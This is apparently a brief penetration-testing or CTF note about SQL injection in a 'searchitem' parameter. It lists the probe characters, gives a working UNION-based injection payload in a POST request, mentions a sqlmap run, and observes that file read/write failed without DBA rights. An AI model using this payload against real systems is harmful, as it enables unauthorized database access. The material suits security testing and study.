- So we have sql injection in `searchitem` parameter
![[Pasted image 20240819143605.png]]
- it appears after test of the next characters
```
'";--#()=-|*/\%_&<>
```
- Here is workable UNION based sql injection
```
POST / HTTP/1.1

searchitem=%%'+union+select+null,'Hello_World',null,null--+-
```
- sqlmap run
![[Pasted image 20240819151024.png]]

- It seems that read and write I cannot because I don't have `dba`